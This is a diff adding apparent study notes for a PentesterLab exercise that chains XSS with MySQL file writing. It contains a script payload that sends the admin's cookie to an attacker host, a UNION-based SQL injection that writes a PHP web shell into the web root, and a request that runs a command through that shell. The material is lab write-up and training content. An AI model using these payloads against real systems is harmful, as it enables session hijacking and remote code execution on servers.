@@ -53,6 +53,31 @@
 #### Payload - <script>alert(1)</script>  ( Test on IE or Edge )
 
 
+### XSS and MySQL FILE (  Pentester Lab )
+#### [Download Link](https://pentesterlab.com/exercises/xss_and_mysql_file/iso) 
+#### Two steps to Attack
+#### 1.Detect and Exploit XSS
+#### 2.Access Admin Panel and exploit SQLi for RCE
+
+#### Port Scanning - nmap -sV -v -A lab_ip
+#### Scanning       - zap
+#### XSS Test
+#### setup listener on attacking machine - python -m SimpleHTTPServer 4444
+
+#### Get Admin Cookie - 
+``` <script>document.write('<img src="http://attacker_ip:4444/?'+document.cookie+' "/>');</script> ```
+
+#### Use cookie editor and developer tool to login like admin
+
+#### Find and Exploit SQLi ( load_file or others )
+``` http://lab_ip/admin/edit.php?id=0 UNION select 1,2,"<?php system($_GET['c']); ?>",4 into outfile "/var/www/css/rce.php" ```
+
+#### Got RCE 
+``` http://192.168.79.168/css/webshell.php?c=whoami ```
+
+
+
+
 ### [Useful Link](https://owasp.org/www-community/xss-filter-evasion-cheatsheet#HTML_entities)
 
 
